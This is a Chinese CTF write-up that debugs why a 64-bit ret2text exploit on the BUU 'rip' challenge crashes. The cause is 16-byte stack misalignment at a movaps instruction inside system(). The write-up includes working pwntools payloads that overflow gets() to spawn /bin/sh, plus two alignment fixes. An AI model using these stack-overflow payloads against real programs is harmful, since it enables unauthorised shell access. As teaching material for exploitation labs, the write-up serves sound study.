# 堆栈对齐——关于64位程序ret2text失败的溯源


## 起

以一道简单的pwn题说明，题目参见[BUU-rip](https://buuoj.cn/challenges#rip)

- 查看保护信息，啥都没开，amd64

```shell
❯ checksec ./pwn1
[*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

- 运行

```shell
❯ ./pwn1
please input
abc
abc
ok,bye!!!
```

- 拖入ida

```c
// main
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[15]; // [rsp+1h] [rbp-Fh] BYREF

  puts("please input");
  gets((__int64)s, (__int64)argv);
  puts(s);
  puts("ok,bye!!!");
  return 0;
}
// backdoor
int fun()
{
  return system("/bin/sh");
}
// fun 汇编
.text:0000000000401186 fun             proc near
.text:0000000000401186 ; __unwind {
.text:0000000000401186                 push    rbp
.text:0000000000401187                 mov     rbp, rsp
.text:000000000040118A                 lea     rdi, command    ; "/bin/sh"
.text:0000000000401191                 call    _system         ; Call Procedure
.text:0000000000401196                 nop                     ; No Operation
.text:0000000000401197                 pop     rbp
.text:0000000000401198                 retn                    ; Return Near from Procedure
.text:0000000000401198 ; } // starts at 401186
.text:0000000000401198 fun             endp
```

所以解题思路就是通过main的gets函数进行栈溢出，覆盖返回地址，跳转到fun执行得到shell

由此得到exp

```python
from pwn import *
context(log_level="debug", arch="amd64", os="linux")
p = process("./pwn1")
payload = b'a'*23 + p64(0x401186)
p.sendlineafter(b"please input\n",payload)
p.interactive()
```

但是get shell失败

## 承

于是去百度了一下，发现各种wp的payload中间多塞了一个地址0x401198，即`payload = b'a'*23 + p64(0x401198) + p64(0x401186)`，试了一下确实可行

文章原因说是为了恢复堆栈平衡，什么是堆栈平衡呢？

我理解的是：在函数调用结束之后，将堆栈恢复到调用之前的样子，从汇编层面来说就是复原esp与ebp

但payload里加了0x401198这个地址只是多执行了一条retn，最多也只是让esp+4之类的，这就能控制堆栈平衡了？我百思不得其解

## 转

拿gdb attach上去调发现了问题，跳转fun调用system函数时包括传参都是正常的，但会断在这一行汇编上

```nasm
0x7fad5eadef43    movaps xmmword ptr [rsp + 0x50], xmm0
; 报错
; Program received signal SIGSEGV, Segmentation fault.
```

在执行glibc中的system系统调用时，很可能会用到movaps指令

movaps：在两个XMM寄存器或XMM寄存器与内存之间移动四个单精度浮点值。要求如果涉及内存，则内存地址必须按16字节对齐，即16进制表示的地址最后一位必须是0

此处可打印rsp+0x50发现确实不符合要求

```shell
pwndbg> p $rsp+0x50
$1 = (void *) 0x7fffd26e4508
```

需要rsp+0x50按16字节对齐，更进一步来说，就是要rsp寄存器指向的地址按16字节对齐，而能够使rsp寄存器变化的无非call、retn、push、pop这些指令。

实际上，程序在正常运行情况下，编译器能保证编译出来的这些指令有序运作，当需要进行system调用时，一定是16字节对齐，使用movaps指令不会产生错误

只有程序堆栈被非正常地修改，程序进行非预期行为时，才可能会出现无法对齐的情况，从而引发`Segmentation fault`，使程序异常退出

再深入去想，由于是64位程序，所以rsp每次的变化要么是rsp-=8,要么是rsp+=8，故rsp所指地址最后一位其实只有两个取值，0或8，为0时堆栈对齐，为8时会引发错误

在进行ret2text时，我们覆盖了函数返回地址，程序本该返回至调用处，却进入了一个新的函数。

在此之前，rsp指向的地址一直是正常的，与程序正常执行无异的，但新函数第一句要执行压栈命令`push rbp`，此时rsp-=8，于是rsp最后一位变成了8，进行system调用时发生错误

那么如何避免错误呢？

显而易见的，我们需要修改rsp寄存器的值，无论是加8还是减8，但同时必须合理利用返回地址才能进行跳转。于是，retn成为了一个很好的选择，我们可以提前布栈，先压入一个retn指令的地址，再压入后门函数的地址

程序首先执行retn指令即`pop rip`使rsp+8，此时紧随其后后门函数的地址赋值给rip，下一步进入后门函数，当执行`push rbp`时rsp-8，此时rsp最后一位变回0，程序正常执行

换一种思路？

既然我们知道了是多了一句`push rbp`出了问题，那我们是不是可以跳过这一句呢？答案是肯定的，我们可以直接把返回地址改为system调用之前传参的地址，即`payload = b'a'*23 + p64(0x40118A)`，一样可以get shell

## 合

64位程序ret2text失败简单以没有平衡堆栈来解释是极不负责的做法

平衡堆栈是指在函数调用结束后，将堆栈恢复到原来的状态。

但我们在利用栈溢出漏洞进行攻击时，并不关心函数调用结束后的状态。只是需要在系统调用之前保证堆栈对齐即可

## Ref

- https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call

- https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/

- https://ropemporium.com/guide.html

以上，如有疏漏请师傅们指出

